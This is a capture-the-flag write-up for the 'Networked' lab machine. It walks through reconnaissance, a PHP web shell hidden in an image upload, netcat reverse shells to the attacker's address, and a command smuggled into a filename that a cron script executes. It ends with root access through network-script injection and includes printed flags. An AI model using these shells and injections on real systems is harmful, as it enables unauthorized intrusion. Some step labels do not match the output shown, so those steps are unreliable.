![Networked.PNG](/assets/Machines/Easy/Networked/Networked.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.146
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.146
```

**Output**
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

3. Visit web page

![web.PNG](/assets/Machines/Easy/Networked/web.PNG)

4. Do **fuzzing directories** in web page with **gobuster**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Networked]
└─| gobuster dir -u http://10.10.10.146 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```


**Output**
```bash
/.hta                 (Status: 403) [Size: 206]
/.htaccess            (Status: 403) [Size: 211]
/.htpasswd            (Status: 403) [Size: 211]
/backup               (Status: 301) [Size: 235] [--> http://10.10.10.146/backup/]
/cgi-bin/             (Status: 403) [Size: 210]
/index.php            (Status: 200) [Size: 229]
/uploads              (Status: 301) [Size: 236] [--> http://10.10.10.146/uploads/]
```

5. Visit directories found
* Path: `http://<Machines's IP>/backup/`

![backup.PNG](/assets/Machines/Easy/Networked/backup.PNG)

6. Download **backup.tar**

7. List files compressed with **7z**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Networked]
└─| 7z l backup.tar
```

**Output**
```bash
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2019-07-09 06:33:38 .....          229          512  index.php
2019-07-02 06:38:56 .....         2001         2048  lib.php
2019-07-02 07:53:53 .....         1871         2048  photos.php
2019-07-02 07:45:10 .....         1331         1536  upload.php
------------------- ----- ------------ ------------  ------------------------
2019-07-09 06:33:38               5432         6144  4 files
```

8. Check in web page if files exists

* `/photos.php`

![photos.php](/assets/Machines/Easy/Networked/photos.PNG)

* `/upload.php`

![upload.php](/assets/Machines/Easy/Networked/upload.PNG)


9. Try to upload a **"photo"** but, hide code PHP

First, download **.jpeg** image and move to new file with 2 extensions `.php.jpeg`

```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Networked]
└─| mv ambient.jpeg ambient.php.jpeg
```

Next, open new file and put php code

![phpcode.PNG](/assets/Machines/Easy/Networked/phpcode.PNG)

10. Upload file and look this path

![path.PNG](/assets/Machines/Easy/Networked/path.PNG)


11. Access to path and try to execute a command
* To do: `http://<Machine's IP>/<Path image>?cmd=whoami`
* Press `Ctrl` + `u`

![output.PNG](/assets/Machines/Easy/Networked/output.PNG)

* We look output of command execute


12. Get reverse shell with **nc** and listen in your machine 
* To do: `http://<Machine's IP>/<Path image>?cmd=nc -e /bin/bash <tun0 IP> <Port>`

**Output**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Networked]
└─| nc -lvnp 445 
listening on [any] 445 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.146] 38520
whoami
apache
```

13. In folder of user **guly** exists a php script
```bash
bash-4.2$ ls
check_attack.php  crontab.guly  user.txt
```
---
```bash
bash-4.2$ cat check_attack.php
```

**Output**
```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

* `exec()` execute commands.

14. Check crontab file
```bash
bash-4.2$ cat crontab.guly 
*/3 * * * * php /home/guly/check_attack.php
```

* This script run **every three minutes**, this crontab executes php **script**.

* The task of **php script** is try to remove all files in `/var/www/html/uploads/`, we try to execute command to get `bash` how guly

* You need to create a file in `/var/www/html/uploads/`, this name will be `; nc -c bash <tun0 IP> <Port>`

**Explanation**
* For separate commands you use `;`, Ex.
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Networked]
└─\ file backup.tar; whoami
backup.tar: POSIX tar archive (GNU)
root
```

* The name file try to execute other command.

15. Listen with nc on port choose in your computer.
16. After create file, wait
```bash
bash-4.2$ touch '; nc -c bash 10.10.14.2 443'
```


17. We obtain a shell how **guly**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Networked]
└─| nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.146] 58352
whoami
guly
```

18. Cat **user flag**
```bash
[guly@networked ~]$ cat user.txt 
9e2388fe8d8fe7850a0d250b0cc5e394
```

---
---
---

## **Privileges Escalation** 💀
1. Search files with 4000 permissions
```bash
[guly@networked ~]$ find / -perm -4000 2>/dev/null
```

**Output**
```bash
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

2. Cat file found
```bash
[guly@networked ~]$ cat /usr/local/sbin/changename.sh
```

**Output**
```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
don
```

3. Run script 
```bash
[guly@networked /]$ sudo -u root ./usr/local/sbin/changename.sh
```

**Output**
```bash
interface NAME:
test
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test
interface BOOTPROTO:
test
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
```

4. Script uses `network-scripts`, search in web for any exploit

* We find this `https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f`

* The way to exploit this is put any string + space + command to execute. Ex.
```bash
interface NAME:
test <command>
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test
interface BOOTPROTO:
test
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
```

5. Try to put SUID permission on `/bin/bash`
```bash
[guly@networked /]$ sudo -u root ./usr/local/sbin/changename.sh
```

**Script run**
```bash
interface NAME:
test bash
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test
interface BOOTPROTO:
test
```

**Output**
```bash
[root@networked network-scripts]| whoami
root
```

6. Cat **root flag**
```bash
[root@networked network-scripts]| cat /root/root.txt 
0479b2b5af0a43ecc628e1bbc40acb52
```